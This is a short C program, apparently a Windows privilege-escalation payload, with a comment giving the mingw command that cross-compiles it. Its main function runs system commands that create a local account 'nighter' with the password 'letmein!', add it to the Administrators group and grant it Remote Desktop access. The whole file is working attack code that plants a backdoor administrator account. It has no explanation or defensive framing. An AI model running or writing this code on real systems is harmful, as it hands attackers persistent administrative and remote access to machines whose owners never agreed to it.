#include <stdlib.h>
/* i686-w64-mingw32-gcc useradd.c -o useradd32.exe -lws2_32 */

int main ()
{
    int i;
    i=system ("net user nighter letmein! /add && net localgroup administrators nighter /add");
    i=system("net localgroup \"Remote Desktop users\" nighter /add");
    return i;
}

